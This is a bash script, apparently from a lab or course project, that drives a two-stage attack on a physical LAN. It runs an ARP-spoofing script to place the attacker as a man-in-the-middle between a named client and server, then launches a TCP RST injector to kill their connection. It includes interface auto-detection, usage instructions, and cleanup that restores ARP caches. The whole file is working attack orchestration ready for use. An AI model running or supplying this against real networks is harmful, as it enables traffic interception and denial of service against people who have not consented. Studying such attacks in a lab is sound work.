#!/usr/bin/env bash
# run_attack.sh — Phase 2 (physical) one-shot attack driver for the Linux VM.
#
# Reuses the Phase 1 attacker code UNCHANGED (../../attacker/arp_spoof.py and
# rst_attack.py); only the IPs and interface differ on a physical LAN. It:
#   1) auto-detects the LAN interface that reaches the server (override with -i),
#   2) ARP-poisons client<->server in the background (IP forwarding on => MITM,
#      not a black-hole DoS), waits for it to settle,
#   3) runs the RST injector.
#
# Stopping:
#   * Ctrl+C ONCE  — stop the injector and restore the victims' ARP caches
#                    (graceful; waits a few seconds for the restore, then exits).
#   * Ctrl+C TWICE — force-quit immediately (SIGKILL everything now; the ARP
#                    caches may be left poisoned, but victims self-heal on
#                    reconnect/reboot). Use this if the graceful stop is slow.
#
# Usage:
#   sudo ./run_attack.sh --server 192.168.1.10 --client 192.168.1.20 [-i wlan0] \
#        [--port 9000] [-- <extra rst_attack.py flags, e.g. --no-server>]
# NOTE: no `set -e` here — signal-interrupted `wait`/`sleep` return non-zero, and
# we handle shutdown explicitly; errexit would abort the cleanup path.
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "$SCRIPT_DIR/../.." && pwd)"
ARP_PY="$REPO_ROOT/attacker/arp_spoof.py"
RST_PY="$REPO_ROOT/attacker/rst_attack.py"

# Use the venv interpreter (scapy lives there). Under sudo, `python3` would be
# the system interpreter and would NOT see the venv, so call it explicitly.
PY="$SCRIPT_DIR/venv/bin/python"
[ -x "$PY" ] || PY="$(command -v python3)"

SERVER=""; CLIENT=""; IFACE=""; PORT="9000"; EXTRA=()
while [ $# -gt 0 ]; do
    case "$1" in
        --server) SERVER="$2"; shift 2;;
        --client) CLIENT="$2"; shift 2;;
        -i|--iface) IFACE="$2"; shift 2;;
        --port) PORT="$2"; shift 2;;
        --) shift; EXTRA=("$@"); break;;
        *) EXTRA+=("$1"); shift;;
    esac
done

[ -f "$ARP_PY" ] && [ -f "$RST_PY" ] || { echo "[attack] FATAL: attacker scripts not found under $REPO_ROOT/attacker (copy the whole repo into the VM)"; exit 1; }
[ -n "$SERVER" ] && [ -n "$CLIENT" ] || { echo "usage: sudo $0 --server <ip> --client <ip> [-i iface] [--port 9000] [-- <rst flags>]"; exit 1; }
[ "$(id -u)" -eq 0 ] || { echo "[attack] run as root: sudo $0 ..."; exit 1; }

# Auto-detect the interface that reaches the server, if not given.
if [ -z "$IFACE" ]; then
    IFACE="$(ip -o route get "$SERVER" 2>/dev/null | awk '{for(i=1;i<=NF;i++) if($i=="dev"){print $(i+1); exit}}')"
    [ -n "$IFACE" ] || { echo "[attack] could not auto-detect interface to $SERVER; pass -i <iface>"; exit 1; }
    echo "[attack] auto-detected interface: $IFACE"
fi

echo "[attack] server=$SERVER client=$CLIENT port=$PORT iface=$IFACE extra=${EXTRA[*]:-<none>}"

ARP_PID=""; RST_PID=""; SIGINT_COUNT=0

# Force-kill everything, right now. Used by the second Ctrl+C and as a last resort.
hard_kill() {
    [ -n "$RST_PID" ] && kill -KILL "$RST_PID" 2>/dev/null
    [ -n "$ARP_PID" ] && kill -KILL "$ARP_PID" 2>/dev/null
    return 0
}

# Wait (bounded) for the ARP poisoner to finish restoring, then make sure it's
# gone. Never blocks forever — that was the old bug. A second Ctrl+C during this
# wait is caught by the trap and turns into an immediate hard kill.
wait_arp_restore() {
    [ -n "$ARP_PID" ] || return 0
    kill -0 "$ARP_PID" 2>/dev/null || return 0
    echo "[attack] restoring ARP caches (up to 6s; press Ctrl+C again to force-quit) ..."
    kill -TERM "$ARP_PID" 2>/dev/null            # SIGTERM: NOT ignored (unlike SIGINT on a bg job)
    local i
    for i in $(seq 1 60); do                     # ~6s ceiling
        kill -0 "$ARP_PID" 2>/dev/null || { echo "[attack] ARP restored; poisoner exited cleanly."; return 0; }
        sleep 0.1 2>/dev/null
    done
    echo "[attack] restore still running after 6s — forcing the poisoner down."
    kill -KILL "$ARP_PID" 2>/dev/null
    return 0
}

# Ctrl+C handler. First press = graceful stop; second press = hard kill NOW.
on_sigint() {
    SIGINT_COUNT=$((SIGINT_COUNT + 1))
    if [ "$SIGINT_COUNT" -ge 2 ]; then
        printf '\n[attack] second Ctrl+C — FORCE KILL now (ARP may remain poisoned; victims self-heal).\n'
        hard_kill
        exit 130
    fi
    printf '\n[attack] Ctrl+C — stopping injector, then restoring ARP ... (Ctrl+C again to force-quit)\n'
    # Injector needs no cleanup, so terminate it hard (also avoids any sniffer hang).
    [ -n "$RST_PID" ] && kill -KILL "$RST_PID" 2>/dev/null
    return 0
}
trap on_sigint INT TERM

# Interruptible sleep: run it as a bg job and `wait`, so Ctrl+C fires the trap
# promptly instead of being swallowed by the sleep.
isleep() { local s; sleep "$1" & s=$!; wait "$s" 2>/dev/null; }

echo "[attack] starting ARP poisoning (MITM) ..."
"$PY" "$ARP_PY" --client "$CLIENT" --server "$SERVER" -i "$IFACE" &
ARP_PID=$!

echo "[attack] waiting 4s for ARP poisoning + MITM to settle ..."
isleep 4

# If the user hit Ctrl+C during the settle wait, restore and exit without attacking.
if [ "$SIGINT_COUNT" -gt 0 ]; then
    wait_arp_restore
    exit 130
fi

echo "[attack] launching RST injector ..."
if [ "${#EXTRA[@]}" -gt 0 ]; then
    "$PY" "$RST_PY" --client "$CLIENT" --server "$SERVER" --port "$PORT" -i "$IFACE" "${EXTRA[@]}" &
else
    "$PY" "$RST_PY" --client "$CLIENT" --server "$SERVER" --port "$PORT" -i "$IFACE" &
fi
RST_PID=$!

# Wait for the injector to finish (its own --duration, or our Ctrl+C killing it).
# `wait` returns early when a trapped signal fires, so loop until it's really gone.
while kill -0 "$RST_PID" 2>/dev/null; do
    wait "$RST_PID" 2>/dev/null
done

# Injector stopped — restore ARP (bounded) and exit.
wait_arp_restore
[ "$SIGINT_COUNT" -gt 0 ] && exit 130
echo "[attack] done."
exit 0
